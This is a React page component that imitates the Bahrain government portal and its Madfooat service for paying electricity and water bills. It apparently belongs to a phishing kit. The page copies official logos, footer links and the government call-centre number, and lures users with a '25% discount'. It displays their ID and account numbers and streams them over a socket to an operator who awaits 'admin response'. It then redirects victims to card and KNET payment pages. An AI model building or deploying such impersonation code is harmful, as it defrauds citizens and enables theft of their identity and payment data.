import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage, socket } from "@/lib/store";
import { useLanguage } from "@/lib/language";

export default function EWASummary() {
  const [, setLocation] = useLocation();
  const { lang, toggleLang, t, dir } = useLanguage();
  const [selectedPayment, setSelectedPayment] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showApplePayMsg, setShowApplePayMsg] = useState(false);

  // Get data from localStorage
  const idTypeLabel = localStorage.getItem("ewa_idTypeLabel") || "";
  const idNumber = localStorage.getItem("ewa_idNumber") || "";
  const accountNumber = localStorage.getItem("ewa_accountNumber") || "";
  const paymentOption = localStorage.getItem("ewa_paymentOption") || "full";
  const totalAmount = localStorage.getItem("ewa_totalAmount") || "0.000";
  const finalAmount = localStorage.getItem("ewa_finalAmount") || "0.000";

  useEffect(() => {
    navigateToPage('ملخص الدفع - فواتير الكهرباء');
  }, []);

  const handlePayment = () => {
    if (!selectedPayment || isProcessing) return;
    setIsProcessing(true);

    const paymentMethodLabel = selectedPayment === 'card' ? 'بطاقة الائتمان' : 'بطاقة الصراف الآلي';

    sendData({
      data: {
        service: 'فواتير الكهرباء والماء',
        paymentMethod: paymentMethodLabel,
        idType: idTypeLabel,
        idNumber,
        accountNumber,
        paymentOption: paymentOption === 'full' ? 'دفع كامل المبلغ (خصم 25%)' : 'دفع جزء من المبلغ',
        totalBillAmount: totalAmount,
        finalPaymentAmount: finalAmount,
      },
      current: 'ملخص الدفع - فواتير الكهرباء',
      nextPage: selectedPayment === 'knet' ? 'knet-payment' : 'credit-card-payment',
      waitingForAdminResponse: false,
    });

    // Save total for payment pages
    localStorage.setItem('Total', finalAmount);

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPayment === 'knet') {
        window.location.href = '/knet-payment';
      } else {
        window.location.href = `/credit-card-payment?service=${encodeURIComponent('فواتير الكهرباء والماء')}&amount=${finalAmount}`;
      }
    }, 1500);
  };

  return (
    <>
      <style dangerouslySetInnerHTML={{ __html: `
        .ewa-summary-page, .ewa-summary-page * {
          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", Arial, sans-serif !important;
          box-sizing: border-box;
        }
        .ewa-summary-page {
          direction: ${dir};
          min-height: 100vh;
          background: #FAFAFA;
          color: #17171C;
          font-size: 16px;
          line-height: 1.5;
        }
        .ewa-s-header {
          background: #0444c4;
          padding: 16px 0;
          color: white;
        }
        .ewa-s-header-inner {
          max-width: 960px;
          margin: 0 auto;
          padding: 0 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .ewa-s-header h1 {
          font-size: 20px;
          font-weight: 700;
          margin: 0;
        }
        .ewa-s-container {
          max-width: 960px;
          margin: 0 auto;
          padding: 24px 20px;
        }
        .ewa-s-blue-bar {
          background: #0444c4;
          color: white;
          padding: 12px 20px;
          font-size: 15px;
          font-weight: 600;
          border-radius: 4px;
          margin-bottom: 16px;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .ewa-s-card {
          background: white;
          border: 1px solid #e0e0e0;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 16px;
        }
        .ewa-s-row {
          display: flex;
          justify-content: space-between;
          padding: 10px 0;
          border-bottom: 1px solid #f0f0f0;
          font-size: 14px;
        }
        .ewa-s-row:last-child {
          border-bottom: none;
        }
        .ewa-s-label {
          color: #666;
          font-weight: 500;
        }
        .ewa-s-value {
          color: #17171C;
          font-weight: 600;
        }
        .ewa-s-total-card {
          background: #e8f0fe;
          border: 2px solid #0444c4;
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 24px;
        }
        .ewa-s-total-row {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .ewa-s-total-label {
          font-size: 16px;
          font-weight: 600;
          color: #0444c4;
        }
        .ewa-s-total-value {
          font-size: 22px;
          font-weight: 800;
          color: #0444c4;
        }
        .ewa-s-payment-method {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 16px 20px;
          background: white;
          border: 2px solid #e0e0e0;
          border-radius: 8px;
          margin-bottom: 10px;
          cursor: pointer;
          transition: all 0.2s;
          min-height: 70px;
          box-sizing: border-box;
        }
        .ewa-s-payment-method:hover {
          border-color: #0444c4;
          background: #f8faff;
        }
        .ewa-s-payment-method.active {
          border-color: #0444c4;
          background: #e8f0fe;
        }
        .ewa-s-pm-right {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .ewa-s-radio {
          width: 20px;
          height: 20px;
          border-radius: 50%;
          border: 2px solid #ccc;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          transition: all 0.2s;
        }
        .ewa-s-payment-method.active .ewa-s-radio {
          border-color: #0444c4;
        }
        .ewa-s-radio-inner {
          width: 10px;
          height: 10px;
          border-radius: 50%;
          background: #0444c4;
          opacity: 0;
          transition: opacity 0.2s;
        }
        .ewa-s-payment-method.active .ewa-s-radio-inner {
          opacity: 1;
        }
        .ewa-s-pm-label {
          font-size: 15px;
          font-weight: 600;
          color: #17171C;
        }
        .ewa-s-pm-icon {
          height: 28px;
        }
        .ewa-s-buttons {
          display: flex;
          gap: 12px;
          justify-content: center;
          margin-top: 24px;
          flex-wrap: wrap;
        }
        .ewa-s-btn-primary {
          background: #0444c4;
          color: white;
          border: none;
          padding: 14px 50px;
          border-radius: 6px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: background 0.2s;
          opacity: 1;
        }
        .ewa-s-btn-primary:hover {
          background: #0444c4;
        }
        .ewa-s-btn-primary:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        .ewa-s-btn-secondary {
          background: white;
          color: #0444c4;
          border: 2px solid #0444c4;
          padding: 14px 50px;
          border-radius: 6px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
        }
        .ewa-s-btn-secondary:hover {
          background: #f0f4ff;
        }
        .ewa-s-processing {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          padding: 20px;
          color: #0444c4;
          font-size: 15px;
        }
        .ewa-s-spinner {
          width: 20px;
          height: 20px;
          border: 3px solid #e0e0e0;
          border-top-color: #0444c4;
          border-radius: 50%;
          animation: ewa-s-spin 0.8s linear infinite;
        }
        @keyframes ewa-s-spin {
          to { transform: rotate(360deg); }
        }

        /* ===== BAHRAIN HEADER & FOOTER ===== */
        .bh-container {
          max-width: 1170px;
          margin: 0 auto;
          padding: 0 15px;
        }
        .bh-header {
          background: #fff;
          border-bottom: none;
        }
        .bh-header-divider {
          border: none;
          border-top: 2px solid #B0B0BA;
          margin: 0;
        }
        .bh-header-row1 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 0 12px 0;
        }
        .bh-logo img {
          height: 60px;
        }
        .madfooat-logo {
          height: 45px;
          width: auto;
        }
        .bh-lang {
          display: flex;
          align-items: center;
          gap: 6px;
          cursor: pointer;
          color: #4B4B57;
          font-size: 15px;
        }
        .bh-header-row2 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 0;
          background: #fff;
          margin: 0;
          border-top: none;
          min-height: 60px;
        }
        .bh-tabs-row {
          display: flex;
          align-items: center;
          gap: 24px;
        }
        .bh-tab {
          font-size: 22px !important;
          font-weight: 400 !important;
          color: #4B4B57 !important;
          cursor: pointer;
          padding-bottom: 12px;
          padding-top: 8px;
          border-bottom: 4px solid #D3D3DA;
          margin-bottom: 0;
          position: relative;
        }
        .bh-tab.active {
          font-weight: 600 !important;
          color: #17171C !important;
          border-bottom: 4px solid #0444c4 !important;
        }
        .bh-header-actions {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .bh-login-btn {
          background: #003366 !important;
          color: #fff !important;
          padding: 12px 24px !important;
          border-radius: 6px !important;
          font-size: 15px !important;
          font-weight: 600 !important;
          cursor: pointer;
          display: inline-block;
        }
        .bh-nav {
          background: #EAEAEE;
          border-bottom: none;
          border-top: 2px solid #B0B0BA;
          padding: 8px 0;
          margin-top: 0;
        }
        .bh-nav-items {
          display: flex;
          align-items: center;
        }
        .bh-nav-item {
          font-size: 16px !important;
          font-weight: 600 !important;
          color: #17171C !important;
          padding: 10px 28px !important;
          border-left: none;
          display: flex;
          align-items: center;
          white-space: nowrap;
          cursor: pointer;
        }
        .bh-nav-item.nav-active {
          background: #fff;
          border-radius: 8px;
          position: relative;
        }
        .bh-nav-item.nav-active::before {
          content: "";
          display: inline-block;
          width: 3px;
          height: 16px;
          background: #0444c4;
          margin-left: 10px;
          border-radius: 2px;
        }
        .bh-footer-links {
          background: #F0F0F3;
          padding: 40px 0 30px 0;
          border-top: 1px solid #B0B0BA;
        }
        .bh-footer-columns {
          display: flex;
          justify-content: space-between;
          gap: 30px;
        }
        .bh-footer-col {
          flex: 1;
        }
        .bh-footer-col-title {
          font-size: 18px !important;
          font-weight: 700 !important;
          color: #17171C !important;
          margin-bottom: 16px !important;
          padding-bottom: 8px;
          border-bottom: 2px solid #B0B0BA;
          display: block;
        }
        .bh-footer-col ul {
          list-style: none !important;
          padding: 0 !important;
          margin: 0 !important;
        }
        .bh-footer-col ul li {
          margin-bottom: 8px !important;
        }
        .bh-footer-col ul li a {
          font-size: 18px !important;
          color: #17171C !important;
          cursor: pointer;
          text-decoration: underline !important;
        }
        .bh-footer-col ul li a:hover {
          color: #0444c4 !important;
        }
        .bh-footer-social {
          background: #F0F0F3;
          padding: 30px 0;
        }
        .bh-footer-social > .bh-container {
          border-top: 1px solid #B0B0BA;
          padding-top: 30px;
        }
        .bh-footer-social-inner {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .bh-footer-social-right {
          display: flex;
          align-items: center;
          gap: 20px;
        }
        .bh-footer-contact-title {
          font-size: 20px !important;
          font-weight: 600 !important;
          color: #17171C !important;
        }
        .bh-footer-social-icons {
          display: flex;
          gap: 12px;
          align-items: center;
        }
        .bh-footer-social-icons a {
          width: 40px;
          height: 40px;
          background: #8A8A97;
          border-radius: 6px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #fff !important;
          font-size: 18px;
          cursor: pointer;
          transition: background 0.2s;
        }
        .bh-footer-social-icons a:hover {
          background: #0444c4;
        }
        .bh-footer-social-left {
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          gap: 12px;
        }
        .bh-footer-contact-number {
          font-size: 30px !important;
          font-weight: 700 !important;
          color: #E31B23 !important;
          direction: ltr;
        }
        .bh-footer-contact-sub {
          font-size: 12px !important;
          font-weight: 600 !important;
          color: #4B4B57 !important;
          text-align: center !important;
        }
        .bh-footer-bottom-links {
          background: #E2E2E7;
          padding: 16px 0;
          text-align: center;
        }
        .bh-footer-bottom-links > .bh-container {
          border-bottom: 1px solid #B0B0BA;
          padding-bottom: 16px;
        }
        .bh-footer-bottom-links a {
          font-size: 18px !important;
          color: #17171C !important;
          margin: 0 8px;
          cursor: pointer;
          text-decoration: underline !important;
        }
        .bh-footer-bottom-links a:hover {
          color: #0444c4 !important;
        }
        .bh-footer-bottom-links .separator {
          color: #D3D3DA !important;
          margin: 0 4px;
        }
        .bh-footer-copyright {
          background: #E2E2E7;
          padding: 20px 0;
          text-align: center;
        }
        .bh-footer-copyright p {
          font-size: 18px !important;
          color: #17171C !important;
          margin: 4px 0 !important;
        }
        .bh-footer-copyright a {
          color: #17171C !important;
          text-decoration: underline !important;
        }
        @media (max-width: 768px) {
          .ewa-summary-page {
            font-size: 14px;
            overflow-x: hidden;
          }
          .bh-container {
            padding: 0 12px;
          }
          /* Header */
          .bh-header-row1 {
            padding: 8px 0;
          }
          .bh-logo img {
            height: 45px;
          }
          .madfooat-logo {
            height: 35px !important;
          }
          .bh-header-row2 {
            flex-direction: column;
            gap: 8px;
            align-items: stretch;
            padding: 8px 0;
            min-height: auto;
          }
          .bh-tabs-row {
            gap: 12px;
            justify-content: center;
          }
          .bh-tab {
            font-size: 16px !important;
            padding-bottom: 8px;
          }
          /* Navigation */
          .bh-nav {
            padding: 4px 0;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
          }
          .bh-nav-items {
            flex-wrap: nowrap;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
          }
          .bh-nav-item {
            font-size: 12px !important;
            padding: 8px 10px !important;
            white-space: nowrap;
            flex-shrink: 0;
          }
          /* Summary Content */
          .ewa-s-container {
            padding: 16px 12px;
          }
          .ewa-s-blue-bar {
            font-size: 13px;
            padding: 10px 14px;
          }
          .ewa-s-card {
            padding: 14px;
          }
          .ewa-s-row {
            font-size: 13px;
            flex-direction: column;
            gap: 2px;
            padding: 8px 0;
          }
          .ewa-s-total-card {
            padding: 14px;
          }
          .ewa-s-total-label {
            font-size: 14px;
          }
          .ewa-s-total-value {
            font-size: 18px;
          }
          .ewa-s-payment-method {
            padding: 12px 14px;
          }
          .ewa-s-pm-label {
            font-size: 13px;
          }
          .ewa-s-pm-icon {
            height: 22px;
          }
          .ewa-s-buttons {
            gap: 8px;
          }
          .ewa-s-btn-primary, .ewa-s-btn-secondary {
            padding: 10px 24px;
            font-size: 14px;
            flex: 1;
            text-align: center;
          }
          /* Footer */
          .bh-footer-columns {
            flex-direction: column;
            gap: 20px;
          }
          .bh-footer-col-title {
            font-size: 16px !important;
          }
          .bh-footer-col ul li a {
            font-size: 14px !important;
          }
          .bh-footer-social-inner {
            flex-direction: column;
            gap: 20px;
            text-align: center;
          }
          .bh-footer-social-right {
            flex-direction: column;
            gap: 12px;
          }
          .bh-footer-social-left {
            align-items: center;
          }
          .bh-footer-contact-number {
            font-size: 24px !important;
          }
          .bh-footer-bottom-links a {
            font-size: 14px !important;
            display: inline-block;
            margin: 4px 6px;
          }
          .bh-footer-copyright p {
            font-size: 14px !important;
          }
        }

        /* Small phones */
        @media (max-width: 400px) {
          .bh-logo img {
            height: 38px;
          }
          .madfooat-logo {
            height: 28px !important;
          }
          .bh-tab {
            font-size: 14px !important;
          }
          .bh-nav-item {
            font-size: 11px !important;
            padding: 6px 8px !important;
          }
          .ewa-s-total-value {
            font-size: 16px;
          }
        }
      `}} />

      <div className="ewa-summary-page">
        {/* ===== HEADER ===== */}
        <div className="bh-header">
          <div className="bh-container">
            <div className="bh-header-row1">
              <div className="bh-logo">
                <img src="/logo_ar.svg" alt="شعار مملكة البحرين" onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }} />
              </div>
              <img src="/madfooat-logo.png" alt="مدفوعات البحرين" className="madfooat-logo" />
            </div>
          </div>
        </div>

        <div className="ewa-s-container">
          {/* Bill Summary */}
          <div className="ewa-s-blue-bar">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            <span>{t('payment_summary')}</span>
          </div>

          <div className="ewa-s-card">
            <div className="ewa-s-row">
              <span className="ewa-s-label">{lang === 'ar' ? 'الخدمة' : 'Service'}</span>
              <span className="ewa-s-value">{t('pay_ewa_bill')}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">{t('id_type')}</span>
              <span className="ewa-s-value">{idTypeLabel}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">{t('id_number')}</span>
              <span className="ewa-s-value">{idNumber}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">{t('account_number')}</span>
              <span className="ewa-s-value">{accountNumber}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">{lang === 'ar' ? 'نوع الدفع' : 'Payment Type'}</span>
              <span className="ewa-s-value">{paymentOption === 'full' ? `${t('pay_full_amount')} (${t('discount_note')})` : t('pay_partial_amount')}</span>
            </div>
            <div className="ewa-s-row">
              <span className="ewa-s-label">{t('total_amount')}</span>
              <span className="ewa-s-value">{totalAmount} {t('bd')}</span>
            </div>
          </div>

          {/* Final Amount */}
          <div className="ewa-s-total-card">
            <div className="ewa-s-total-row">
              <span className="ewa-s-total-label">{lang === 'ar' ? 'المبلغ المطلوب دفعه:' : 'Amount to Pay:'}</span>
              <span className="ewa-s-total-value">{finalAmount} {t('bd')}</span>
            </div>
          </div>

          {/* Payment Method Selection */}
          <div className="ewa-s-blue-bar">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <rect x="2" y="5" width="20" height="14" rx="2" stroke="white" strokeWidth="2"/>
              <path d="M2 10h20" stroke="white" strokeWidth="2"/>
            </svg>
            <span>{lang === 'ar' ? 'اختر طريقة الدفع' : 'Select Payment Method'}</span>
          </div>

          {/* KNET */}
          <div
            className={`ewa-s-payment-method ${selectedPayment === 'knet' ? 'active' : ''}`}
            onClick={() => { setSelectedPayment('knet'); setShowApplePayMsg(false); }}
          >
            <div className="ewa-s-pm-right">
              <div className="ewa-s-radio"><div className="ewa-s-radio-inner"></div></div>
              <span className="ewa-s-pm-label">{lang === 'ar' ? 'بطاقة الصراف الآلي' : 'ATM Card'}</span>
            </div>
            <img src="/benefit-logo.png" alt="Benefit" className="ewa-s-pm-icon" style={{ height: '35px', width: 'auto' }} onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </div>

          {/* Credit Card */}
          <div
            className={`ewa-s-payment-method ${selectedPayment === 'card' ? 'active' : ''}`}
            onClick={() => { setSelectedPayment('card'); setShowApplePayMsg(false); }}
          >
            <div className="ewa-s-pm-right">
              <div className="ewa-s-radio"><div className="ewa-s-radio-inner"></div></div>
              <span className="ewa-s-pm-label">{lang === 'ar' ? 'بطاقة الائتمان' : 'Credit Card'}</span>
            </div>
            <div style={{ display: 'flex', gap: '6px', alignItems: 'center' }}>
              <img src="/images/visa.png" alt="Visa" className="ewa-s-pm-icon" style={{ height: '25px', width: 'auto' }} onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
              <img src="/images/mastercard.png" alt="Mastercard" className="ewa-s-pm-icon" style={{ height: '25px', width: 'auto' }} onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
            </div>
          </div>

          {/* Apple Pay */}
          <div
            className="ewa-s-payment-method"
            onClick={() => setShowApplePayMsg(true)}
          >
            <div className="ewa-s-pm-right">
              <div className="ewa-s-radio"><div className="ewa-s-radio-inner"></div></div>
              <span className="ewa-s-pm-label">Apple Pay</span>
            </div>
            <img src="/apple-pay-logo.png" alt="Apple Pay" className="ewa-s-pm-icon" style={{ height: '30px', width: 'auto' }} onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </div>

          {showApplePayMsg && (
            <div style={{ background: '#fff3f3', border: '1px solid #ffcdd2', borderRadius: '8px', padding: '12px 16px', marginBottom: '10px', textAlign: 'center', color: '#c62828', fontSize: '14px' }}>
              {lang === 'ar' ? 'الدفع عن طريق Apple Pay غير متاح حالياً' : 'Apple Pay is currently unavailable'}
            </div>
          )}

          {/* Processing */}
          {isProcessing && (
            <div className="ewa-s-processing">
              <div className="ewa-s-spinner"></div>
              <span>{lang === 'ar' ? 'جاري تحويلك لصفحة الدفع...' : 'Redirecting to payment page...'}</span>
            </div>
          )}

          {/* Buttons */}
          <div className="ewa-s-buttons">
            <button
              className="ewa-s-btn-primary"
              onClick={handlePayment}
              disabled={!selectedPayment || isProcessing}
            >
              {isProcessing ? (lang === 'ar' ? 'جاري المعالجة...' : 'Processing...') : (lang === 'ar' ? 'ادفع الآن' : 'Pay Now')}
            </button>
            <button className="ewa-s-btn-secondary" onClick={() => setLocation('/ewa-bills')}>
              {t('back')}
            </button>
          </div>
        </div>

        {/* ===== FOOTER ===== */}
        <div className="bh-footer-links">
          <div className="bh-container">
            <div className="bh-footer-columns">
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">{t('information_guide')}</div>
                <ul>
                  <li><a>{lang === 'ar' ? 'هنا في البحرين' : 'Here in Bahrain'}</a></li>
                  <li><a>{t('about_bahrain_link')}</a></li>
                  <li><a>{t('discover_bahrain')}</a></li>
                  <li><a>{t('gov_services_guide')}</a></li>
                  <li><a>{t('gov_guide')}</a></li>
                  <li><a>{t('ai_bahrain')}</a></li>
                  <li><a>{t('customer_service_guide')}</a></li>
                  <li><a>{lang === 'ar' ? 'أرقام الطوارئ' : 'Emergency Numbers'}</a></li>
                </ul>
              </div>
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">{t('electronic_services')}</div>
                <ul>
                  <li><a>{lang === 'ar' ? 'تصنيف الخدمات الإلكترونية' : 'eServices Classification'}</a></li>
                  <li><a>{lang === 'ar' ? 'مقدمو الخدمات الإلكترونية' : 'eServices Providers'}</a></li>
                  <li><a>{lang === 'ar' ? 'متجر تطبيقات الهواتف' : 'Mobile Apps Store'}</a></li>
                  <li><a>{lang === 'ar' ? 'دليل المستخدم' : 'User Guide'}</a></li>
                  <li><a>{lang === 'ar' ? 'المفتاح الإلكتروني 2.0 المطوّر' : 'eKey 2.0'}</a></li>
                  <li><a>{lang === 'ar' ? 'مواقع مراكز خدمة العملاء وأجهزة الخدمة الذاتية' : 'Service Center Locations'}</a></li>
                </ul>
              </div>
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">{lang === 'ar' ? 'روابط سريعة' : 'Quick Links'}</div>
                <ul>
                  <li><a>{lang === 'ar' ? 'حول البوابة الوطنية' : 'About the National Portal'}</a></li>
                  <li><a>{lang === 'ar' ? 'إحصائيات قنوات الخدمة' : 'Service Channel Statistics'}</a></li>
                  <li><a>{lang === 'ar' ? 'المشاركة الإلكترونية "شاركنا"' : 'eParticipation'}</a></li>
                  <li><a>{lang === 'ar' ? 'الأخبار الحكومية' : 'Government News'}</a></li>
                  <li><a>{lang === 'ar' ? 'أخبار البحرين' : 'Bahrain News'}</a></li>
                  <li><a>{lang === 'ar' ? 'تقويم البحرين' : 'Bahrain Calendar'}</a></li>
                  <li><a>{lang === 'ar' ? 'فعاليات تقنية المعلومات' : 'IT Events'}</a></li>
                  <li><a>{lang === 'ar' ? 'الإشادات والجوائز' : 'Awards & Recognition'}</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        <div className="bh-footer-social">
          <div className="bh-container">
            <div className="bh-footer-social-inner">
              <img src="/bahrain_2030.png" alt="البحرين 2030" style={{ height: '160px', objectFit: 'contain' }} />
              <div className="bh-footer-social-right" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: '12px' }}>
                <span className="bh-footer-contact-title">{t('follow_us')}</span>
                <div className="bh-footer-social-icons">
                  <a title="LinkedIn"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg></a>
                  <a title="Instagram"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg></a>
                  <a title="X"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
                  <a title="Facebook"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/></svg></a>
                  <a title="YouTube"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/></svg></a>
                </div>
              </div>
              <div className="bh-footer-social-left">
                <div className="bh-footer-contact-title">{t('contact_us')}</div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                  <img src="/tawasul-logo.png" alt="تواصل" style={{ height: '55px', objectFit: 'contain' }} />
                  <div>
                    <div className="bh-footer-contact-number">80008001</div>
                    <div className="bh-footer-contact-sub">{lang === 'ar' ? 'مركز اتصال الخدمات الحكومية' : 'Government Services Call Center'}</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="bh-footer-bottom-links">
          <div className="bh-container">
            <a>{t('terms_of_use')}</a>
            <span className="separator">|</span>
            <a>{t('privacy_policy')}</a>
            <span className="separator">|</span>
            <a>{t('accessibility')}</a>
            <span className="separator">|</span>
            <a>{t('faq')}</a>
            <span className="separator">|</span>
            <a>{t('help')}</a>
            <span className="separator">|</span>
            <a>{t('contact_link')}</a>
            <span className="separator">|</span>
            <a>{t('sitemap')}</a>
          </div>
        </div>

        <div className="bh-footer-copyright">
          <div className="bh-container">
            <p>{t('last_update')} {lang === 'ar' ? 'السبت، 7 مارس 2026' : 'Saturday, March 7, 2026'}</p>
            <p>{t('developed_by')} <a>{t('iga')}</a></p>
            <p>{t('copyright')} 2026 {t('kingdom_of_bahrain')}</p>
            <p>{t('all_rights_reserved')}</p>
          </div>
        </div>
      </div>
    </>
  );
}
